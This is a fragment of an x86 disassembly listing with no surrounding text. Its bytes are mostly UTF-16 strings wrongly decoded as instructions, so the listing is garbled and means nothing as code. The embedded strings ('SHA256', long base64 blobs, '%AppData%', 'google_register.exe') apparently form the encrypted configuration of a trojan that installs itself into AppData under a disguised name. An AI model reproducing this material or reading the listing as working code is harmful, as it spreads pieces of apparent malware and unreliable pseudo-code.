  409f16:	7a 00                	jp     0x409f18
  409f18:	52                   	push   %edx
  409f19:	4b                   	dec    %ebx
  409f1a:	43                   	inc    %ebx
  409f1b:	79 71                	jns    0x409f8e
  409f1d:	68 58 50 62 6b       	push   $0x6b625058
  409f22:	7a 00                	jp     0x409f24
  409f24:	78 53                	js     0x409f79
  409f26:	6f                   	outsl  %ds:(%esi),(%dx)
  409f27:	58                   	pop    %eax
  409f28:	58                   	pop    %eax
  409f29:	6b 70 4e 4d          	imul   $0x4d,0x4e(%eax),%esi
  409f2d:	76 4e                	jbe    0x409f7d
  409f2f:	79 7a                	jns    0x409fab
  409f31:	00 00                	add    %al,(%eax)
  409f33:	00 00                	add    %al,(%eax)
  409f35:	0d 53 00 48 00       	or     $0x480053,%eax
  409f3a:	41                   	inc    %ecx
  409f3b:	00 32                	add    %dh,(%edx)
  409f3d:	00 35 00 36 00 00    	add    %dh,0x3600
  409f43:	81 59 34 00 4f 00 76 	sbbl   $0x76004f00,0x34(%ecx)
  409f4a:	00 2f                	add    %ch,(%edi)
  409f4c:	00 37                	add    %dh,(%edi)
  409f4e:	00 6a 00             	add    %ch,0x0(%edx)
  409f51:	39 00                	cmp    %eax,(%eax)
  409f53:	2f                   	das
  409f54:	00 42 00             	add    %al,0x0(%edx)
  409f57:	67 00 32             	add    %dh,(%bp,%si)
  409f5a:	00 66 00             	add    %ah,0x0(%esi)
  409f5d:	62 00                	bound  %eax,(%eax)
  409f5f:	56                   	push   %esi
  409f60:	00 39                	add    %bh,(%ecx)
  409f62:	00 35 00 64 00 4e    	add    %dh,0x4e006400
  409f68:	00 79 00             	add    %bh,0x0(%ecx)
  409f6b:	4d                   	dec    %ebp
  409f6c:	00 63 00             	add    %ah,0x0(%ebx)
  409f6f:	4f                   	dec    %edi
  409f70:	00 33                	add    %dh,(%ebx)
  409f72:	00 49 00             	add    %cl,0x0(%ecx)
  409f75:	56                   	push   %esi
  409f76:	00 62 00             	add    %ah,0x0(%edx)
  409f79:	61                   	popa
  409f7a:	00 63 00             	add    %ah,0x0(%ebx)
  409f7d:	48                   	dec    %eax
  409f7e:	00 75 00             	add    %dh,0x0(%ebp)
  409f81:	72 00                	jb     0x409f83
  409f83:	42                   	inc    %edx
  409f84:	00 4d 00             	add    %cl,0x0(%ebp)
  409f87:	51                   	push   %ecx
  409f88:	00 76 00             	add    %dh,0x0(%esi)
  409f8b:	52                   	push   %edx
  409f8c:	00 52 00             	add    %dl,0x0(%edx)
  409f8f:	59                   	pop    %ecx
  409f90:	00 78 00             	add    %bh,0x0(%eax)
  409f93:	5a                   	pop    %edx
  409f94:	00 39                	add    %bh,(%ecx)
  409f96:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  409f9a:	00 32                	add    %dh,(%edx)
  409f9c:	00 38                	add    %bh,(%eax)
  409f9e:	00 6e 00             	add    %ch,0x0(%esi)
  409fa1:	76 00                	jbe    0x409fa3
  409fa3:	7a 00                	jp     0x409fa5
  409fa5:	73 00                	jae    0x409fa7
  409fa7:	70 00                	jo     0x409fa9
  409fa9:	56                   	push   %esi
  409faa:	00 6a 00             	add    %ch,0x0(%edx)
  409fad:	35 00 45 00 2b       	xor    $0x2b004500,%eax
  409fb2:	00 75 00             	add    %dh,0x0(%ebp)
  409fb5:	77 00                	ja     0x409fb7
  409fb7:	75 00                	jne    0x409fb9
  409fb9:	61                   	popa
  409fba:	00 73 00             	add    %dh,0x0(%ebx)
  409fbd:	46                   	inc    %esi
  409fbe:	00 48 00             	add    %cl,0x0(%eax)
  409fc1:	55                   	push   %ebp
  409fc2:	00 73 00             	add    %dh,0x0(%ebx)
  409fc5:	79 00                	jns    0x409fc7
  409fc7:	79 00                	jns    0x409fc9
  409fc9:	71 00                	jno    0x409fcb
  409fcb:	43                   	inc    %ebx
  409fcc:	00 4f 00             	add    %cl,0x0(%edi)
  409fcf:	6e                   	outsb  %ds:(%esi),(%dx)
  409fd0:	00 4b 00             	add    %cl,0x0(%ebx)
  409fd3:	61                   	popa
  409fd4:	00 6b 00             	add    %ch,0x0(%ebx)
  409fd7:	51                   	push   %ecx
  409fd8:	00 35 00 42 00 66    	add    %dh,0x66004200
  409fde:	00 73 00             	add    %dh,0x0(%ebx)
  409fe1:	53                   	push   %ebx
  409fe2:	00 75 00             	add    %dh,0x0(%ebp)
  409fe5:	4f                   	dec    %edi
  409fe6:	00 33                	add    %dh,(%ebx)
  409fe8:	00 46 00             	add    %al,0x0(%esi)
  409feb:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  409fef:	37                   	aaa
  409ff0:	00 63 00             	add    %ah,0x0(%ebx)
  409ff3:	50                   	push   %eax
  409ff4:	00 42 00             	add    %al,0x0(%edx)
  409ff7:	54                   	push   %esp
  409ff8:	00 35 00 31 00 72    	add    %dh,0x72003100
  409ffe:	00 6f 00             	add    %ch,0x0(%edi)
  40a001:	72 00                	jb     0x40a003
  40a003:	4c                   	dec    %esp
  40a004:	00 79 00             	add    %bh,0x0(%ecx)
  40a007:	50                   	push   %eax
  40a008:	00 6e 00             	add    %ch,0x0(%esi)
  40a00b:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40a00f:	63 00                	arpl   %eax,(%eax)
  40a011:	61                   	popa
  40a012:	00 65 00             	add    %ah,0x0(%ebp)
  40a015:	30 00                	xor    %al,(%eax)
  40a017:	68 00 59 00 56       	push   $0x56005900
  40a01c:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a020:	00 52 00             	add    %dl,0x0(%edx)
  40a023:	37                   	aaa
  40a024:	00 4d 00             	add    %cl,0x0(%ebp)
  40a027:	4f                   	dec    %edi
  40a028:	00 52 00             	add    %dl,0x0(%edx)
  40a02b:	6c                   	insb   (%dx),%es:(%edi)
  40a02c:	00 36                	add    %dh,(%esi)
  40a02e:	00 70 00             	add    %dh,0x0(%eax)
  40a031:	6b 00 56             	imul   $0x56,(%eax),%eax
  40a034:	00 63 00             	add    %ah,0x0(%ebx)
  40a037:	53                   	push   %ebx
  40a038:	00 59 00             	add    %bl,0x0(%ecx)
  40a03b:	61                   	popa
  40a03c:	00 46 00             	add    %al,0x0(%esi)
  40a03f:	6c                   	insb   (%dx),%es:(%edi)
  40a040:	00 36                	add    %dh,(%esi)
  40a042:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40a046:	00 72 00             	add    %dh,0x0(%edx)
  40a049:	69 00 73 00 7a 00    	imul   $0x7a0073,(%eax),%eax
  40a04f:	49                   	dec    %ecx
  40a050:	00 2f                	add    %ch,(%edi)
  40a052:	00 68 00             	add    %ch,0x0(%eax)
  40a055:	32 00                	xor    (%eax),%al
  40a057:	43                   	inc    %ebx
  40a058:	00 50 00             	add    %dl,0x0(%eax)
  40a05b:	47                   	inc    %edi
  40a05c:	00 70 00             	add    %dh,0x0(%eax)
  40a05f:	79 00                	jns    0x40a061
  40a061:	66 00 76 00          	data16 add %dh,0x0(%esi)
  40a065:	2f                   	das
  40a066:	00 50 00             	add    %dl,0x0(%eax)
  40a069:	53                   	push   %ebx
  40a06a:	00 32                	add    %dh,(%edx)
  40a06c:	00 4e 00             	add    %cl,0x0(%esi)
  40a06f:	44                   	inc    %esp
  40a070:	00 6a 00             	add    %ch,0x0(%edx)
  40a073:	34 00                	xor    $0x0,%al
  40a075:	4d                   	dec    %ebp
  40a076:	00 55 00             	add    %dl,0x0(%ebp)
  40a079:	44                   	inc    %esp
  40a07a:	00 52 00             	add    %dl,0x0(%edx)
  40a07d:	37                   	aaa
  40a07e:	00 42 00             	add    %al,0x0(%edx)
  40a081:	76 00                	jbe    0x40a083
  40a083:	5a                   	pop    %edx
  40a084:	00 35 00 37 00 71    	add    %dh,0x71003700
  40a08a:	00 2b                	add    %ch,(%ebx)
  40a08c:	00 66 00             	add    %ah,0x0(%esi)
  40a08f:	77 00                	ja     0x40a091
  40a091:	49                   	dec    %ecx
  40a092:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a095:	50                   	push   %eax
  40a096:	00 58 00             	add    %bl,0x0(%eax)
  40a099:	6f                   	outsl  %ds:(%esi),(%dx)
  40a09a:	00 3d 00 00 80 d9    	add    %bh,0xd9800000
  40a0a0:	2b 00                	sub    (%eax),%eax
  40a0a2:	30 00                	xor    %al,(%eax)
  40a0a4:	41                   	inc    %ecx
  40a0a5:	00 67 00             	add    %ah,0x0(%edi)
  40a0a8:	55                   	push   %ebp
  40a0a9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0ac:	7a 00                	jp     0x40a0ae
  40a0ae:	4b                   	dec    %ebx
  40a0af:	00 69 00             	add    %ch,0x0(%ecx)
  40a0b2:	4e                   	dec    %esi
  40a0b3:	00 58 00             	add    %bl,0x0(%eax)
  40a0b6:	6c                   	insb   (%dx),%es:(%edi)
  40a0b7:	00 68 00             	add    %ch,0x0(%eax)
  40a0ba:	79 00                	jns    0x40a0bc
  40a0bc:	34 00                	xor    $0x0,%al
  40a0be:	7a 00                	jp     0x40a0c0
  40a0c0:	57                   	push   %edi
  40a0c1:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40a0c5:	00 48 00             	add    %cl,0x0(%eax)
  40a0c8:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40a0cc:	34 00                	xor    $0x0,%al
  40a0ce:	6a 00                	push   $0x0
  40a0d0:	74 00                	je     0x40a0d2
  40a0d2:	38 00                	cmp    %al,(%eax)
  40a0d4:	4b                   	dec    %ebx
  40a0d5:	00 6a 00             	add    %ch,0x0(%edx)
  40a0d8:	43                   	inc    %ebx
  40a0d9:	00 55 00             	add    %dl,0x0(%ebp)
  40a0dc:	41                   	inc    %ecx
  40a0dd:	00 30                	add    %dh,(%eax)
  40a0df:	00 30                	add    %dh,(%eax)
  40a0e1:	00 66 00             	add    %ah,0x0(%esi)
  40a0e4:	6d                   	insl   (%dx),%es:(%edi)
  40a0e5:	00 6a 00             	add    %ch,0x0(%edx)
  40a0e8:	73 00                	jae    0x40a0ea
  40a0ea:	4a                   	dec    %edx
  40a0eb:	00 56 00             	add    %dl,0x0(%esi)
  40a0ee:	5a                   	pop    %edx
  40a0ef:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40a0f3:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40a0f7:	00 55 00             	add    %dl,0x0(%ebp)
  40a0fa:	74 00                	je     0x40a0fc
  40a0fc:	6c                   	insb   (%dx),%es:(%edi)
  40a0fd:	00 67 00             	add    %ah,0x0(%edi)
  40a100:	57                   	push   %edi
  40a101:	00 65 00             	add    %ah,0x0(%ebp)
  40a104:	78 00                	js     0x40a106
  40a106:	61                   	popa
  40a107:	00 7a 00             	add    %bh,0x0(%edx)
  40a10a:	32 00                	xor    (%eax),%al
  40a10c:	46                   	inc    %esi
  40a10d:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  40a111:	00 49 00             	add    %cl,0x0(%ecx)
  40a114:	76 00                	jbe    0x40a116
  40a116:	64 00 39             	add    %bh,%fs:(%ecx)
  40a119:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40a11d:	00 6e 00             	add    %ch,0x0(%esi)
  40a120:	49                   	dec    %ecx
  40a121:	00 72 00             	add    %dh,0x0(%edx)
  40a124:	48                   	dec    %eax
  40a125:	00 31                	add    %dh,(%ecx)
  40a127:	00 4e 00             	add    %cl,0x0(%esi)
  40a12a:	48                   	dec    %eax
  40a12b:	00 4e 00             	add    %cl,0x0(%esi)
  40a12e:	30 00                	xor    %al,(%eax)
  40a130:	2f                   	das
  40a131:	00 59 00             	add    %bl,0x0(%ecx)
  40a134:	48                   	dec    %eax
  40a135:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  40a139:	00 50 00             	add    %dl,0x0(%eax)
  40a13c:	71 00                	jno    0x40a13e
  40a13e:	44                   	inc    %esp
  40a13f:	00 47 00             	add    %al,0x0(%edi)
  40a142:	34 00                	xor    $0x0,%al
  40a144:	34 00                	xor    $0x0,%al
  40a146:	67 00 2b             	add    %ch,(%bp,%di)
  40a149:	00 73 00             	add    %dh,0x0(%ebx)
  40a14c:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40a150:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40a154:	6b 00 55             	imul   $0x55,(%eax),%eax
  40a157:	00 70 00             	add    %dh,0x0(%eax)
  40a15a:	6b 00 53             	imul   $0x53,(%eax),%eax
  40a15d:	00 78 00             	add    %bh,0x0(%eax)
  40a160:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40a163:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40a167:	00 65 00             	add    %ah,0x0(%ebp)
  40a16a:	2b 00                	sub    (%eax),%eax
  40a16c:	63 00                	arpl   %eax,(%eax)
  40a16e:	58                   	pop    %eax
  40a16f:	00 32                	add    %dh,(%edx)
  40a171:	00 35 00 73 00 3d    	add    %dh,0x3d007300
  40a177:	00 00                	add    %al,(%eax)
  40a179:	80 b1 59 00 59 00 5a 	xorb   $0x5a,0x590059(%ecx)
  40a180:	00 38                	add    %bh,(%eax)
  40a182:	00 78 00             	add    %bh,0x0(%eax)
  40a185:	30 00                	xor    %al,(%eax)
  40a187:	4b                   	dec    %ebx
  40a188:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40a18c:	00 6f 00             	add    %ch,0x0(%edi)
  40a18f:	70 00                	jo     0x40a191
  40a191:	59                   	pop    %ecx
  40a192:	00 51 00             	add    %dl,0x0(%ecx)
  40a195:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40a199:	6f                   	outsl  %ds:(%esi),(%dx)
  40a19a:	00 61 00             	add    %ah,0x0(%ecx)
  40a19d:	50                   	push   %eax
  40a19e:	00 47 00             	add    %al,0x0(%edi)
  40a1a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1a2:	00 58 00             	add    %bl,0x0(%eax)
  40a1a5:	73 00                	jae    0x40a1a7
  40a1a7:	4e                   	dec    %esi
  40a1a8:	00 33                	add    %dh,(%ebx)
  40a1aa:	00 4f 00             	add    %cl,0x0(%edi)
  40a1ad:	73 00                	jae    0x40a1af
  40a1af:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1b0:	00 4f 00             	add    %cl,0x0(%edi)
  40a1b3:	2b 00                	sub    (%eax),%eax
  40a1b5:	55                   	push   %ebp
  40a1b6:	00 69 00             	add    %ch,0x0(%ecx)
  40a1b9:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1ba:	00 50 00             	add    %dl,0x0(%eax)
  40a1bd:	34 00                	xor    $0x0,%al
  40a1bf:	77 00                	ja     0x40a1c1
  40a1c1:	35 00 52 00 72       	xor    $0x72005200,%eax
  40a1c6:	00 79 00             	add    %bh,0x0(%ecx)
  40a1c9:	48                   	dec    %eax
  40a1ca:	00 68 00             	add    %ch,0x0(%eax)
  40a1cd:	67 00 6c 00          	add    %ch,0x0(%si)
  40a1d1:	30 00                	xor    %al,(%eax)
  40a1d3:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40a1d7:	45                   	inc    %ebp
  40a1d8:	00 50 00             	add    %dl,0x0(%eax)
  40a1db:	55                   	push   %ebp
  40a1dc:	00 71 00             	add    %dh,0x0(%ecx)
  40a1df:	76 00                	jbe    0x40a1e1
  40a1e1:	4c                   	dec    %esp
  40a1e2:	00 59 00             	add    %bl,0x0(%ecx)
  40a1e5:	37                   	aaa
  40a1e6:	00 57 00             	add    %dl,0x0(%edi)
  40a1e9:	77 00                	ja     0x40a1eb
  40a1eb:	68 00 48 00 48       	push   $0x48004800
  40a1f0:	00 6e 00             	add    %ch,0x0(%esi)
  40a1f3:	63 00                	arpl   %eax,(%eax)
  40a1f5:	2b 00                	sub    (%eax),%eax
  40a1f7:	35 00 2b 00 62       	xor    $0x62002b00,%eax
  40a1fc:	00 49 00             	add    %cl,0x0(%ecx)
  40a1ff:	78 00                	js     0x40a201
  40a201:	4a                   	dec    %edx
  40a202:	00 51 00             	add    %dl,0x0(%ecx)
  40a205:	5a                   	pop    %edx
  40a206:	00 36                	add    %dh,(%esi)
  40a208:	00 37                	add    %dh,(%edi)
  40a20a:	00 2f                	add    %ch,(%edi)
  40a20c:	00 46 00             	add    %al,0x0(%esi)
  40a20f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a213:	39 00                	cmp    %eax,(%eax)
  40a215:	59                   	pop    %ecx
  40a216:	00 79 00             	add    %bh,0x0(%ecx)
  40a219:	56                   	push   %esi
  40a21a:	00 6a 00             	add    %ch,0x0(%edx)
  40a21d:	45                   	inc    %ebp
  40a21e:	00 32                	add    %dh,(%edx)
  40a220:	00 4d 00             	add    %cl,0x0(%ebp)
  40a223:	74 00                	je     0x40a225
  40a225:	77 00                	ja     0x40a227
  40a227:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a22c:	80 b1 33 00 76 00 4c 	xorb   $0x4c,0x760033(%ecx)
  40a233:	00 57 00             	add    %dl,0x0(%edi)
  40a236:	50                   	push   %eax
  40a237:	00 57 00             	add    %dl,0x0(%edi)
  40a23a:	69 00 69 00 39 00    	imul   $0x390069,(%eax),%eax
  40a240:	58                   	pop    %eax
  40a241:	00 42 00             	add    %al,0x0(%edx)
  40a244:	72 00                	jb     0x40a246
  40a246:	6d                   	insl   (%dx),%es:(%edi)
  40a247:	00 77 00             	add    %dh,0x0(%edi)
  40a24a:	78 00                	js     0x40a24c
  40a24c:	59                   	pop    %ecx
  40a24d:	00 2b                	add    %ch,(%ebx)
  40a24f:	00 37                	add    %dh,(%edi)
  40a251:	00 38                	add    %bh,(%eax)
  40a253:	00 6d 00             	add    %ch,0x0(%ebp)
  40a256:	6e                   	outsb  %ds:(%esi),(%dx)
  40a257:	00 66 00             	add    %ah,0x0(%esi)
  40a25a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a25b:	00 58 00             	add    %bl,0x0(%eax)
  40a25e:	74 00                	je     0x40a260
  40a260:	49                   	dec    %ecx
  40a261:	00 76 00             	add    %dh,0x0(%esi)
  40a264:	79 00                	jns    0x40a266
  40a266:	54                   	push   %esp
  40a267:	00 4d 00             	add    %cl,0x0(%ebp)
  40a26a:	2b 00                	sub    (%eax),%eax
  40a26c:	31 00                	xor    %eax,(%eax)
  40a26e:	44                   	inc    %esp
  40a26f:	00 47 00             	add    %al,0x0(%edi)
  40a272:	73 00                	jae    0x40a274
  40a274:	6d                   	insl   (%dx),%es:(%edi)
  40a275:	00 6d 00             	add    %ch,0x0(%ebp)
  40a278:	63 00                	arpl   %eax,(%eax)
  40a27a:	58                   	pop    %eax
  40a27b:	00 70 00             	add    %dh,0x0(%eax)
  40a27e:	7a 00                	jp     0x40a280
  40a280:	70 00                	jo     0x40a282
  40a282:	47                   	inc    %edi
  40a283:	00 63 00             	add    %ah,0x0(%ebx)
  40a286:	53                   	push   %ebx
  40a287:	00 6a 00             	add    %ch,0x0(%edx)
  40a28a:	4c                   	dec    %esp
  40a28b:	00 35 00 38 00 7a    	add    %dh,0x7a003800
  40a291:	00 65 00             	add    %ah,0x0(%ebp)
  40a294:	4b                   	dec    %ebx
  40a295:	00 61 00             	add    %ah,0x0(%ecx)
  40a298:	58                   	pop    %eax
  40a299:	00 68 00             	add    %ch,0x0(%eax)
  40a29c:	31 00                	xor    %eax,(%eax)
  40a29e:	73 00                	jae    0x40a2a0
  40a2a0:	59                   	pop    %ecx
  40a2a1:	00 6e 00             	add    %ch,0x0(%esi)
  40a2a4:	7a 00                	jp     0x40a2a6
  40a2a6:	2f                   	das
  40a2a7:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40a2ab:	00 75 00             	add    %dh,0x0(%ebp)
  40a2ae:	2b 00                	sub    (%eax),%eax
  40a2b0:	7a 00                	jp     0x40a2b2
  40a2b2:	53                   	push   %ebx
  40a2b3:	00 42 00             	add    %al,0x0(%edx)
  40a2b6:	47                   	inc    %edi
  40a2b7:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40a2bb:	00 59 00             	add    %bl,0x0(%ecx)
  40a2be:	71 00                	jno    0x40a2c0
  40a2c0:	76 00                	jbe    0x40a2c2
  40a2c2:	59                   	pop    %ecx
  40a2c3:	00 46 00             	add    %al,0x0(%esi)
  40a2c6:	76 00                	jbe    0x40a2c8
  40a2c8:	49                   	dec    %ecx
  40a2c9:	00 67 00             	add    %ah,0x0(%edi)
  40a2cc:	4a                   	dec    %edx
  40a2cd:	00 65 00             	add    %ah,0x0(%ebp)
  40a2d0:	76 00                	jbe    0x40a2d2
  40a2d2:	6a 00                	push   $0x0
  40a2d4:	4c                   	dec    %esp
  40a2d5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a2d8:	41                   	inc    %ecx
  40a2d9:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a2df:	13 25 00 41 00 70    	adc    0x70004100,%esp
  40a2e5:	00 70 00             	add    %dh,0x0(%eax)
  40a2e8:	44                   	inc    %esp
  40a2e9:	00 61 00             	add    %ah,0x0(%ecx)
  40a2ec:	74 00                	je     0x40a2ee
  40a2ee:	61                   	popa
  40a2ef:	00 25 00 00 27 67    	add    %ah,0x67270000
  40a2f5:	00 6f 00             	add    %ch,0x0(%edi)
  40a2f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2f9:	00 67 00             	add    %ah,0x0(%edi)
  40a2fc:	6c                   	insb   (%dx),%es:(%edi)
  40a2fd:	00 65 00             	add    %ah,0x0(%ebp)
  40a300:	5f                   	pop    %edi
  40a301:	00 72 00             	add    %dh,0x0(%edx)
  40a304:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a308:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40a30e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a312:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a316:	78 00                	js     0x40a318
  40a318:	65 00 00             	add    %al,%gs:(%eax)
  40a31b:	59                   	pop    %ecx
  40a31c:	63 00                	arpl   %eax,(%eax)
  40a31e:	32 00                	xor    (%eax),%al
  40a320:	46                   	inc    %esi
  40a321:	00 4a 00             	add    %cl,0x0(%edx)
  40a324:	61                   	popa
  40a325:	00 47 00             	add    %al,0x0(%edi)
  40a328:	78 00                	js     0x40a32a
  40a32a:	5a                   	pop    %edx
  40a32b:	00 59 00             	add    %bl,0x0(%ecx)
  40a32e:	57                   	push   %edi
  40a32f:	00 4e 00             	add    %cl,0x0(%esi)
  40a332:	56                   	push   %esi
  40a333:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40a337:	00 4d 00             	add    %cl,0x0(%ebp)
  40a33a:	30 00                	xor    %al,(%eax)
  40a33c:	62 00                	bound  %eax,(%eax)
  40a33e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a33f:	00 4a 00             	add    %cl,0x0(%edx)
  40a342:	30 00                	xor    %al,(%eax)
  40a344:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40a348:	74 00                	je     0x40a34a
  40a34a:	6a 00                	push   $0x0
  40a34c:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40a350:	4a                   	dec    %edx
  40a351:	00 73 00             	add    %dh,0x0(%ebx)
  40a354:	54                   	push   %esp
  40a355:	00 56 00             	add    %dl,0x0(%esi)
  40a358:	4e                   	dec    %esi
  40a359:	00 32                	add    %dh,(%edx)
  40a35b:	00 62 00             	add    %ah,0x0(%edx)
  40a35e:	54                   	push   %esp
  40a35f:	00 4a 00             	add    %cl,0x0(%edx)
  40a362:	4a                   	dec    %edx
  40a363:	00 56 00             	add    %dl,0x0(%esi)
  40a366:	33 00                	xor    (%eax),%eax
  40a368:	42                   	inc    %edx
  40a369:	00 58 00             	add    %bl,0x0(%eax)
  40a36c:	56                   	push   %esi
  40a36d:	00 30                	add    %dh,(%eax)
  40a36f:	00 63 00             	add    %ah,0x0(%ebx)
  40a372:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  40a377:	2f                   	das
  40a378:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40a37c:	00 55 00             	add    %dl,0x0(%ebp)
  40a37f:	34 00                	xor    $0x0,%al
  40a381:	44                   	inc    %esp
  40a382:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  40a386:	00 62 00             	add    %ah,0x0(%edx)
  40a389:	74 00                	je     0x40a38b
  40a38b:	59                   	pop    %ecx
  40a38c:	00 41 00             	add    %al,0x0(%ecx)
  40a38f:	78 00                	js     0x40a391
  40a391:	4e                   	dec    %esi
  40a392:	00 39                	add    %bh,(%ecx)
  40a394:	00 4f 00             	add    %cl,0x0(%edi)
  40a397:	31 00                	xor    %eax,(%eax)
  40a399:	45                   	inc    %ebp
  40a39a:	00 55 00             	add    %dl,0x0(%ebp)
  40a39d:	70 00                	jo     0x40a39f
  40a39f:	44                   	inc    %esp
  40a3a0:	00 61 00             	add    %ah,0x0(%ecx)
  40a3a3:	31 00                	xor    %eax,(%eax)
  40a3a5:	6b 00 63             	imul   $0x63,(%eax),%eax
  40a3a8:	00 31                	add    %dh,(%ecx)
  40a3aa:	00 2b                	add    %ch,(%ebx)
  40a3ac:	00 2b                	add    %ch,(%ebx)
  40a3ae:	00 65 00             	add    %ah,0x0(%ebp)
  40a3b1:	70 00                	jo     0x40a3b3
  40a3b3:	68 00 4f 00 43       	push   $0x43004f00
  40a3b8:	00 39                	add    %bh,(%ecx)
  40a3ba:	00 72 00             	add    %dh,0x0(%edx)
  40a3bd:	58                   	pop    %eax
  40a3be:	00 77 00             	add    %dh,0x0(%edi)
  40a3c1:	4f                   	dec    %edi
  40a3c2:	00 58 00             	add    %bl,0x0(%eax)
  40a3c5:	46                   	inc    %esi
  40a3c6:	00 62 00             	add    %ah,0x0(%edx)
  40a3c9:	41                   	inc    %ecx
  40a3ca:	00 51 00             	add    %dl,0x0(%ecx)
  40a3cd:	53                   	push   %ebx
  40a3ce:	00 72 00             	add    %dh,0x0(%edx)
  40a3d1:	6a 00                	push   $0x0
  40a3d3:	49                   	dec    %ecx
  40a3d4:	00 52 00             	add    %dl,0x0(%edx)
  40a3d7:	78 00                	js     0x40a3d9
  40a3d9:	54                   	push   %esp
  40a3da:	00 47 00             	add    %al,0x0(%edi)
  40a3dd:	62 00                	bound  %eax,(%eax)
  40a3df:	69 00 64 00 5a 00    	imul   $0x5a0064,(%eax),%eax
  40a3e5:	51                   	push   %ecx
  40a3e6:	00 31                	add    %dh,(%ecx)
  40a3e8:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40a3ec:	00 32                	add    %dh,(%edx)
  40a3ee:	00 37                	add    %dh,(%edi)
  40a3f0:	00 70 00             	add    %dh,0x0(%eax)
  40a3f3:	54                   	push   %esp
  40a3f4:	00 69 00             	add    %ch,0x0(%ecx)
  40a3f7:	2f                   	das
  40a3f8:	00 38                	add    %bh,(%eax)
  40a3fa:	00 77 00             	add    %dh,0x0(%edi)
  40a3fd:	68 00 30 00 57       	push   $0x57003000
  40a402:	00 79 00             	add    %bh,0x0(%ecx)
  40a405:	7a 00                	jp     0x40a407
  40a407:	41                   	inc    %ecx
  40a408:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40a40c:	00 39                	add    %bh,(%ecx)
  40a40e:	00 67 00             	add    %ah,0x0(%edi)
  40a411:	38 00                	cmp    %al,(%eax)
  40a413:	69 00 77 00 37 00    	imul   $0x370077,(%eax),%eax
  40a419:	4f                   	dec    %edi
  40a41a:	00 77 00             	add    %dh,0x0(%edi)
  40a41d:	4c                   	dec    %esp
  40a41e:	00 58 00             	add    %bl,0x0(%eax)
  40a421:	67 00 3d             	add    %bh,(%di)
  40a424:	00 3d 00 00 92 59    	add    %bh,0x59920000
  40a42a:	48                   	dec    %eax
  40a42b:	00 47 00             	add    %al,0x0(%edi)
  40a42e:	67 00 76 00          	add    %dh,0x0(%bp)
  40a432:	33 00                	xor    (%eax),%eax
  40a434:	52                   	push   %edx
  40a435:	00 59 00             	add    %bl,0x0(%ecx)
  40a438:	32 00                	xor    (%eax),%al
  40a43a:	4d                   	dec    %ebp
  40a43b:	00 4a 00             	add    %cl,0x0(%edx)
  40a43e:	39 00                	cmp    %eax,(%eax)
  40a440:	66 00 46 00          	data16 add %al,0x0(%esi)
  40a444:	41                   	inc    %ecx
  40a445:	00 49 00             	add    %cl,0x0(%ecx)
  40a448:	78 00                	js     0x40a44a
  40a44a:	6c                   	insb   (%dx),%es:(%edi)
  40a44b:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  40a44f:	00 56 00             	add    %dl,0x0(%esi)
  40a452:	47                   	inc    %edi
  40a453:	00 4d 00             	add    %cl,0x0(%ebp)
  40a456:	6f                   	outsl  %ds:(%esi),(%dx)
  40a457:	00 56 00             	add    %dl,0x0(%esi)
  40a45a:	32 00                	xor    (%eax),%al
  40a45c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a45d:	00 63 00             	add    %ah,0x0(%ebx)
  40a460:	76 00                	jbe    0x40a462
  40a462:	64 00 64 00 31       	add    %ah,%fs:0x31(%eax,%eax,1)
  40a467:	00 4f 00             	add    %cl,0x0(%edi)
  40a46a:	79 00                	jns    0x40a46c
  40a46c:	41                   	inc    %ecx
  40a46d:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40a471:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40a475:	00 41 00             	add    %al,0x0(%ecx)
  40a478:	5a                   	pop    %edx
  40a479:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40a47d:	00 65 00             	add    %ah,0x0(%ebp)
  40a480:	74 00                	je     0x40a482
  40a482:	53                   	push   %ebx
